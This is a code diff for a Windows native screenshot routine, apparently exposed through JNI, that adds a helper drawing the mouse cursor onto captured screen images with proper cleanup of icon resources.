@@ -11,6 +11,49 @@
 #define QOI_OP_LUMA  0b10000000
 #define QOI_OP_RUN   0b11000000
 
+static void drawCursor(const HDC context) {
+	CURSORINFO cursorInformation;
+	cursorInformation.cbSize = sizeof(CURSORINFO);
+
+	if(!GetCursorInfo(&cursorInformation) || cursorInformation.flags != CURSOR_SHOWING) {
+		return;
+	}
+
+	HICON icon = CopyIcon(cursorInformation.hCursor);
+
+	if(!icon) {
+		return;
+	}
+
+	ICONINFO iconInformation;
+
+	if(!GetIconInfo(icon, &iconInformation)) {
+		goto destroyIcon;
+	}
+
+	if(!iconInformation.hbmColor) {
+		goto deleteIconBitmap;
+	}
+
+	BITMAP bitmap;
+
+	if(!GetObjectW(iconInformation.hbmColor, sizeof(bitmap), &bitmap)) {
+		goto deleteIconBitmap;
+	}
+
+	if(!DrawIconEx(context, cursorInformation.ptScreenPos.x - iconInformation.xHotspot, cursorInformation.ptScreenPos.y - iconInformation.yHotspot, cursorInformation.hCursor, bitmap.bmWidth, bitmap.bmHeight, 0, NULL, DI_NORMAL)) {
+		goto deleteIconBitmap;
+	}
+deleteIconBitmap:
+	DeleteObject(iconInformation.hbmMask);
+
+	if(iconInformation.hbmColor) {
+		DeleteObject(iconInformation.hbmColor);
+	}
+destroyIcon:
+	DestroyIcon(icon);
+}
+
 BOOL TakeScreenshot(JNIEnv* const environment, const SOCKET clientSocket) {
 	HDC context = GetDC(NULL);
 	int width = GetDeviceCaps(context, HORZRES);
@@ -19,6 +62,7 @@ BOOL TakeScreenshot(JNIEnv* const environment, const SOCKET clientSocket) {
 	HBITMAP bitmap = CreateCompatibleBitmap(context, width, height);
 	HBITMAP oldBitmap = SelectObject(memoryContext, bitmap);
 	BitBlt(memoryContext, 0, 0, width, height, context, 0, 0, SRCCOPY);
+	drawCursor(memoryContext);
 	bitmap = SelectObject(memoryContext, oldBitmap);
 	size_t bufferSize = width * height * 4;
 	BYTE* buffer = LocalAlloc(LMEM_FIXED, bufferSize);
